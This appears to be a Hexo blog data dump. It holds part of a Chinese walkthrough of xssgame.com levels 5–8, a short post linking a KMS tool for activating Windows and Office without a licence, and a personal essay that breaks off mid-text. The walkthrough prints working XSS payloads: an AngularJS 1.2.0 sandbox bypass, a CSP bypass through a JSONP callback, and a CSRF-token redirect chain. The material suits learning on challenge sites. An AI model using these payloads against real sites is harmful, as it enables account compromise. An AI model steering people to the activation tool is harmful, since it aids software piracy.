class=\"line\">http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term=&#123;&#123;alert()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>过关：</p>\n<p><img src=\"/Image/Level_5_Pass.png\" alt=\"Level_5_Pass\"></p>\n<p>(至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~)</p>\n<h2 id=\"LEVEL-6\"><a href=\"#LEVEL-6\" class=\"headerlink\" title=\"LEVEL 6\"></a>LEVEL 6</h2><p><a href=\"http://www.xssgame.com/rWKWwJGnAeyi\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_6_Welcome.png\" alt=\"Level_6_Welcome\"></p>\n<p>（前面那个关的 boss 死了，儿子又来了？？？）</p>\n<p>没什么卵用的翻译（其实还是有用的~）：</p>\n<blockquote>\n<p>导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。<br>目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。</p>\n</blockquote>\n<p>这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况：</p>\n<p><img src=\"/Image/Level_6_Search.png\" alt=\"Level_6_Search\"></p>\n<p>手动输入 <strong>query</strong> 使用 get 方式搜索：</p>\n<p><img src=\"/Image/Level_6_Query.png\" alt=\"Level_6_Query\"></p>\n<p>我们注意到页面均显示出我们之前搜索的字符串。</p>\n<p>新的页面中的代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">ng-non-bindable</span>&gt;</span>Sorry, no results were found for <span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>1234<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>.<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>‘ng-non-bindable’ 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们搞 form 中的那个。</p>\n<p>我们注意到这样一段代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。<br>这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。</p>\n<p><img src=\"/Image/Level_6_Google_XSS.png\" alt=\"Level_6_Google_XSS\"></p>\n<p>按照惯例，我们先看一下第一个：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</div></pre></td></tr></table></figure></p>\n<p><img src=\"/Image/Level_6_PortSwigger.png\" alt=\"Level_6_PortSwigger\"></p>\n<p>有兴趣的可以去看一下，写的头头是道啊~</p>\n<p>当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：<br>我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;&#123;a=<span class=\"string\">'constructor'</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class=\"number\">0</span>,<span class=\"string\">'alert(1)'</span>)()&#125;&#125;</div></pre></td></tr></table></figure>\n<p>直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是：</p>\n<p><img src=\"/Image/Level_6_Search_Para.png\" alt=\"Level_6_Search_Para\"></p>\n<p>我们拼一下 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&#123;&#123;a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&#125;&#125;</div></pre></td></tr></table></figure></p>\n<p>好，提交，过关：</p>\n<p><img src=\"/Image/hei2.jpeg\" alt=\"heiren\"></p>\n<p><img src=\"/Image/Level_6_Query_String.png\" alt=\"Level_6_Query_String\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">把&apos;&#123;&apos;、&apos;&#125;&apos;换成&apos;&amp;lcub;&apos;、&apos;&amp;rcub;&apos;试一下(google 来的~我也记不住是啥。)</div><div class=\"line\">也可以只替换&apos;&#123;&apos;,因为&apos;&#125;&apos;并没有被过滤，不过我查都查了，替！</div></pre></td></tr></table></figure></p>\n<p>新的 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&amp;rcub;&amp;rcub;</div></pre></td></tr></table></figure></p>\n<p>冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」：</p>\n<p><img src=\"/Image/Level_6_Pass.png\" alt=\"Level_6_Pass\"></p>\n<p>咳咳，过关过关……</p>\n<h2 id=\"LEVEL-7\"><a href=\"#LEVEL-7\" class=\"headerlink\" title=\"LEVEL 7\"></a>LEVEL 7</h2><p><a href=\"http://www.xssgame.com/wmOM2q5NJnZS\" target=\"_blank\" rel=\"external\">贴心传送门</a></p>\n<p><img src=\"/Image/Level_7_Welcome.png\" alt=\"Level_7_Welcome.png\"></p>\n<p>翻译君：</p>\n<blockquote>\n<p>内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。<br>这个挑战显示了一种常见的CSP旁路技术。<br>目标是再次使用应用程序中的循环来执行JavaScript alert()函数。</p>\n</blockquote>\n<p>其中提到了一个东西 ‘CSP’ 就是’内容安全策略’, 这是啥东西呢？</p>\n<blockquote>\n<p>内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。<br>– 来自 wiki 百科</p>\n</blockquote>\n<p>这次除了 (index) 文件，我们还有两个地方需要关注下：</p>\n<p><img src=\"/Image/Level_7_Web_DOM.png\" alt=\"Level_7_Web_DOM\"></p>\n<p>按照惯例，我们先看一下页面文件 (index)：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=YWJvdXQ=\"</span>&gt;</span>About Me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=Y2F0cw==\"</span>&gt;</span>Cats<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"?menu=ZG9ncw==\"</span>&gt;</span>Dogs<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/static/js/level7.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。</p>\n<p>我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">    <span class=\"comment\">//找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。</span></div><div class=\"line\">    <span class=\"comment\">//atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">callback</span>(<span class=\"params\">data</span>)</span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 通过代码判断，data 应该是 json 格式。</span></div><div class=\"line\">    <span class=\"comment\">// 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源</span></div><div class=\"line\">&#125;</div><div class=\"line\">main(); <span class=\"comment\">//执行 main 方法</span></div></pre></td></tr></table></figure></p>\n<p>这个代码段比较简单，我们看一下 ‘jsonp?menu=about’ 的内容：</p>\n<p><img src=\"/Image/Level_7_Web_Jsonp.png\" alt=\"level_7_Web_Jsonp\"></p>\n<p>我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 ‘jsonp’：</p>\n<p><img src=\"/Image/Level_7_Jsonp_XSS.png\" alt=\"Level_7_Jsonp_XSS\"></p>\n<p>呀呵，第一个就是知道创宇的文章: <a href=\"http://blog.knownsec.com/2015/03/jsonp_security_technic/\" target=\"_blank\" rel=\"external\">JSONP 安全攻防技术</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">JSONP：</div><div class=\"line\">JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 &lt;script&gt;&lt;/script&gt; 元素标签，远程调用 JSON 文件来实现数据传递。</div></pre></td></tr></table></figure>\n<p>这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。</p>\n<p>回到正题，文中有这样一段引起了我们的注意：</p>\n<p><img src=\"/Image/Level_7_Jsonp_XSS_Blog.png\" alt=\"Level_7_Jsonp_XSS_Blog\"></p>\n<p>我们用 callback 这个参数去我们的 Level 7 中测试一下：</p>\n<p><img src=\"/Image/Level_7_Callback_Test.png\" alt=\"Level_7_Callback_Test\"></p>\n<p>ok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。</p>\n<p>Level7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">main</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">var</span> m = location.search.match(<span class=\"string\">'menu=(.*)'</span>);<span class=\"comment\">// 查找了一下当前 URL 中 'menu=' 后面的参数</span></div><div class=\"line\">    <span class=\"keyword\">var</span> menu = m ? atob(m[<span class=\"number\">1</span>]) : <span class=\"string\">'about'</span>; <span class=\"comment\">// 如果没有获取到参数，则赋值为 'about'</span></div><div class=\"line\">    <span class=\"built_in\">document</span>.write(<span class=\"string\">'&lt;script src=\"jsonp?menu='</span> + <span class=\"built_in\">encodeURIComponent</span>(menu) + <span class=\"string\">'\"&gt;&lt;/script&gt;'</span>); <span class=\"comment\">// 在页面中写入 &lt;script&gt; 标签 ，通过 src 请求资源</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。</p>\n<p>想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：’about’、’cats’、’dogs’。相应的会有三种 callback 的 JSON 对象。</p>\n<p>如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。</p>\n<p>我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，’atob’ 函数是解码，编码函数猜也猜到应该是 ‘btoa’ 了~<br>在 chrome 浏览器的控制台下输入：</p>\n<p><img src=\"/Image/Level_7_Btoa_Function.png\" alt=\"Level_7_Btoa_Function\"></p>\n<p>得到转码后的值，在输入到浏览器中：</p>\n<p><img src=\"/Image/Level_7_Ev1l_Response.png\" alt=\"Level_7_Ev1l_Response\"></p>\n<p>我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。</p>\n<p>后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」</p>\n<p>尝试通关：</p>\n<p>我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">先在控制台 btoa(&quot;&lt;img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt;&quot;) 得到 &quot;PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=&quot;</div><div class=\"line\">再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=</div></pre></td></tr></table></figure>\n<p><img src=\"/Image/Level_7_Img_Pass_Fail.png\" alt=\"Level_7_Img_Pass_Fail\"></p>\n<p>chrome 控制台红字提示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Refused to execute inline event handler because it violates the following Content Security Policy directive: &quot;default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/&quot;. Either the &apos;unsafe-inline&apos; keyword, a hash (&apos;sha256-...&apos;), or a nonce (&apos;nonce-...&apos;) is required to enable inline execution. Note also that &apos;script-src&apos; was not explicitly set, so &apos;default-src&apos; is used as a fallback.</div></pre></td></tr></table></figure></p>\n<p>因为 CSP 的关系，失败了。</p>\n<p>没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。</p>\n<p>先给个小提示：</p>\n<p><img src=\"/Image/Level_7_Pass_idea.png\" alt=\"Level_7_Pass_idea\"></p>\n<p>自己先想两分钟~</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">给 menu 传入经过 base64 编码后的：</div><div class=\"line\">    &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // 转义前为：&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;</div><div class=\"line\">会把</div><div class=\"line\">    &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;</div><div class=\"line\">显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为：</div><div class=\"line\">    alert();//(&#123;...&#125;)</div><div class=\"line\">alert(); 后面被注释掉，执行 alert();</div></pre></td></tr></table></figure>\n<p>最后我们组织的 URL 为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+</div></pre></td></tr></table></figure></p>\n<p>过关：</p>\n<p><img src=\"/Image/Level_7_Pass.png\" alt=\"Level_7_Pass\"></p>\n<h2 id=\"Level-8\"><a href=\"#Level-8\" class=\"headerlink\" title=\"Level 8\"></a>Level 8</h2><p><a href=\"http://www.xssgame.com/d9u16LTxchEi\" target=\"_blank\" rel=\"external\">最后一关的贴心传送门 QAQ</a></p>\n<p><img src=\"/Image/Level_8_Welcome.png\" alt=\"Level_8_Welcome\"></p>\n<blockquote>\n<p>This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS.</p>\n</blockquote>\n<p>好，我们继续无视提示信息，来看一下这一关。</p>\n<p>尊敬下上一关，我们先看一下 Level8.js 的内容：</p>\n<p><img src=\"/Image/Level_8_Level8js.png\" alt=\"Level_8_Level8js\"></p>\n<p>这个文件负责读取 cookie 的信息，如果读取到了 ‘name’ 的内容，就 document.write 到页面上。<br>通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&amp;*，他一显示到页面上不就……</p>\n<p>行了，别意淫了：</p>\n<p><img src=\"/Image/Level_8_CSP.png\" alt=\"Level_8_CSP\"></p>\n<p>我们来看看有没有其他可以利用的地方呢。先试试功能吧。</p>\n<p>我们随便设置一下名字：</p>\n<p><img src=\"/Image/Level_8_Set_Name.png\" alt=\"Level_8_Set_Name\"></p>\n<p>点击 Set 看看发生了什么:</p>\n<p><img src=\"/Image/Level_8_Set_End.png\" alt=\"Level_8_Set_End\"></p>\n<p>页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=Geekaleo&amp;redirect=index</div><div class=\"line\">其中：</div><div class=\"line\">set?name=name&amp;value=Geekaleo&amp;redirect=index</div><div class=\"line\">name=name value=Geekaleo 不禁让人菊花一紧</div><div class=\"line\">那我：</div><div class=\"line\">name=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……</div><div class=\"line\"></div><div class=\"line\">redirect=index 显然这个参数是用来跳转的</div></pre></td></tr></table></figure></p>\n<p>set csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水：</p>\n<p><img src=\"/Image/Level_8_Send.png\" alt=\"Level_8_Send\"></p>\n<p>我们接到了一个警告福利：</p>\n<p><img src=\"/Image/Level_8_Send_Fail.png\" alt=\"Level_8_Send_Fail\"></p>\n<p>这里我们得到了几个有用的信息：</p>\n<blockquote>\n<p>1.我们输入的不合法金额也就是 ‘amount’ 参数的值被返回到了前台打印了出来。<br>2.此页面没有 CSP 的标识。<br>3.csrf_token 作为参数传递给后台。  </p>\n</blockquote>\n<p>根据前两点呢，我们测试一下 把 ‘amount’ 的内容改成一段能够触发 alert() 的脚本：</p>\n<p><img src=\"/Image/Level_8_Pass_Fail.png\" alt=\"Level_8_Pass_Fail\"></p>\n<p>成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的：</p>\n<p><img src=\"/Image/Level_8_Token_Not_Same.png\" alt=\"Level_8_Token_Not_Same\"></p>\n<p>这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。</p>\n<p>我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。</p>\n<p>OK，我们来构建URL：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass</div><div class=\"line\"></div><div class=\"line\">这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 &amp; 符会被截断。</div><div class=\"line\"></div><div class=\"line\">所以我们这里 把这个 &apos;redirect=&apos; 后面的内容处理一下，chrome 控制台：</div><div class=\"line\">encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;)</div><div class=\"line\">得到返回值：</div><div class=\"line\">transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass</div><div class=\"line\"></div><div class=\"line\">好我们替换一下 URL：</div><div class=\"line\">http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass</div></pre></td></tr></table></figure>\n<p>:) 过关：</p>\n<p><img src=\"/Image/Level_8_Pass.png\" alt=\"Level_8_Pass\"></p>\n<p>愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间……</p>\n<p><img src=\"/Image/All_Level_Pass.png\" alt=\"All_Level_Pass\"></p>\n<p>「别等了，没彩蛋…… QAQ」</p>"},{"title":"Windows 及 Office 激活 —— KMS","date":"2017-06-01T09:43:35.000Z","layout":"post","comments":1,"--reward":true,"_content":"\n# 一款强大的 windows、office 激活软件  \n—KMS\n<!--more-->\n\n简单介绍一下：激活windows、office 并可以自己建立计划任务每隔一段时间自动重新激活一次（激活时间180天）。\n\n进入软件选择KMSAuto Net -> Activation -> Activate windows (office)\n\n> 倔强的相信自己能找到激活码，奈何现实告诉我不如老老实实的用KMS……  \n\n|下载方式|下载地址|备注|\n|:--------:|:--------:|:--------:|\n|百度云|[KMS Tools](http://pan.baidu.com/s/1qXByYKk)|提取码: e86k|","source":"_posts/crackWindows10.md","raw":"---\ntitle: Windows 及 Office 激活 —— KMS\ndate: 2017-6-1 17:43:35\nlayout: post\ncomments: true\n--reward: true\ntags:\n    - 工具\n\n---\n\n# 一款强大的 windows、office 激活软件  \n—KMS\n<!--more-->\n\n简单介绍一下：激活windows、office 并可以自己建立计划任务每隔一段时间自动重新激活一次（激活时间180天）。\n\n进入软件选择KMSAuto Net -> Activation -> Activate windows (office)\n\n> 倔强的相信自己能找到激活码，奈何现实告诉我不如老老实实的用KMS……  \n\n|下载方式|下载地址|备注|\n|:--------:|:--------:|:--------:|\n|百度云|[KMS Tools](http://pan.baidu.com/s/1qXByYKk)|提取码: e86k|","slug":"crackWindows10","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k880009mkwbma5105q4","content":"<h1 id=\"一款强大的-windows、office-激活软件\"><a href=\"#一款强大的-windows、office-激活软件\" class=\"headerlink\" title=\"一款强大的 windows、office 激活软件\"></a>一款强大的 windows、office 激活软件</h1><p>—KMS<br><a id=\"more\"></a></p>\n<p>简单介绍一下：激活windows、office 并可以自己建立计划任务每隔一段时间自动重新激活一次（激活时间180天）。</p>\n<p>进入软件选择KMSAuto Net -&gt; Activation -&gt; Activate windows (office)</p>\n<blockquote>\n<p>倔强的相信自己能找到激活码，奈何现实告诉我不如老老实实的用KMS……  </p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">下载方式</th>\n<th style=\"text-align:center\">下载地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">百度云</td>\n<td style=\"text-align:center\"><a href=\"http://pan.baidu.com/s/1qXByYKk\" target=\"_blank\" rel=\"external\">KMS Tools</a></td>\n<td style=\"text-align:center\">提取码: e86k</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"<h1 id=\"一款强大的-windows、office-激活软件\"><a href=\"#一款强大的-windows、office-激活软件\" class=\"headerlink\" title=\"一款强大的 windows、office 激活软件\"></a>一款强大的 windows、office 激活软件</h1><p>—KMS<br>","more":"</p>\n<p>简单介绍一下：激活windows、office 并可以自己建立计划任务每隔一段时间自动重新激活一次（激活时间180天）。</p>\n<p>进入软件选择KMSAuto Net -&gt; Activation -&gt; Activate windows (office)</p>\n<blockquote>\n<p>倔强的相信自己能找到激活码，奈何现实告诉我不如老老实实的用KMS……  </p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">下载方式</th>\n<th style=\"text-align:center\">下载地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">百度云</td>\n<td style=\"text-align:center\"><a href=\"http://pan.baidu.com/s/1qXByYKk\" target=\"_blank\" rel=\"external\">KMS Tools</a></td>\n<td style=\"text-align:center\">提取码: e86k</td>\n</tr>\n</tbody>\n</table>"},{"title":"一次反人类的自我对话","date":"2017-04-12T17:19:49.000Z","layout":"post","comments":1,"--reward":true,"_content":"\n![heirenwenhao](/Image/alone.jpg)\n\n前几天工作的压力还是蛮大的，好在只要是你想解决，问题总归是会解决的。  \n这段日子算是难得地小憩了一下。与外界断了联系，每天跑跑步，健健身，不太靠谱的注意下自己的饮食，听听音乐，看看电影，有一集没一集的追追美剧，不紧不慢的上下班，看看牛人写的`鸡汤`(《黑客与画家》)。跳出到紧张的节奏之外（其实闲下来感觉还是蛮紧张的……），也算是享受享受`孤独`，还是很惬意。\n\n<!--more-->\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=139177&auto=0&height=66\"></iframe>\n------\n\n# 鸡汤\n### 《黑客与画家》\n没读这本书之前，不知道里面讲的到底是什么。单是书名，就够我浮想联翩一下午的了。  \n原因吗？  \n\n**我对黑客有种特殊的感情。**  \n**会画画的女孩很迷人。**  \n\n第一点么，感情酝酿到位了，资料也准备到位了，然而行动就……打自己脸的事情先跳过吧，有缘再讲……  \n至于第二点么，**会画画的女孩很迷人**。会画画的女孩总是不缺少一双发现美的眼睛，做事也不缺少条理性。\n前前后后，遇见过3个会画画的女孩子。但我的初恋也是我的前任的她却不会……  \n\n与初恋在初中相识。  \n与X在高中相识。  \n与Y在大学相识。  \n与Z在工作后通过Internet相识。  \n\n**我的人生还是蛮幸运的，在不同的阶段，都遇到了那些优秀又迷人的女孩子。即使相隔万里，也真诚的祝福你们过得快乐。  \n我这种天性孤独的人，确实比较适合在四下无人的夜里，默默的凝望着繁星送上一句想念就好。**  \n\n\n《黑客与画家》这本书呢，是硅谷创业之父的文集，多记载了个人对某些事物见解，而不是技术类书籍。  是一本翻开看内容时不停的刷新我的某些认知并折磨着脑细胞的书。建议有脑子的人都读一读。\n\n------\n\n# 孤独\n### 感谢那些从你生命中消失的人\n如果一定要对他们说句话，我其实想说谢谢。  \n无论我们当初怎么相识，又因何故分离，感谢你们当初的陪伴，也谢谢你们最后把时间还给了我。\n\n时间是我们的一生中唯一一个避不开的东西，无论我今天是什么样子，都是已经过去的每一分每一秒换来的。  \n这段时间里，我正在努力的变得更优秀一点，也期盼着遇见像当初的你们于当初的我来讲那样优秀迷人的人。\n\n我总是乐于承认自己不够优秀，也偶尔会被同样不够优秀的人拉住衣角问“你已经很好了，为什么还不知足？”  \n**停不下来也许是心虚吧，怕遇见更好的你，却不是配得上更好的你的自己。**  \n\n\n### 拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\n\n举几个例子\n\n你害怕孤独，同时你喜欢一个人，但是你并没有优秀到对方可以凝望着你的脸庞眼神中充满了迷恋说出喜欢你的地步，你该怎么做？是选择一个喜欢你的人？还是让你喜欢的人也喜欢上你？  \n\n你害怕孤独，在你喜欢的和喜欢你的之间，你选择了后者。后者为了让你喜欢上自己不停的在努力。随着时间的推移，你如何保证在这个从未停止转动的世界里，喜欢你的人不会遇到比你更优秀的人？而对方又如何寄希望与你，让对方相信选择你是正确的，你对对方来说永远都是哪个特别的人？  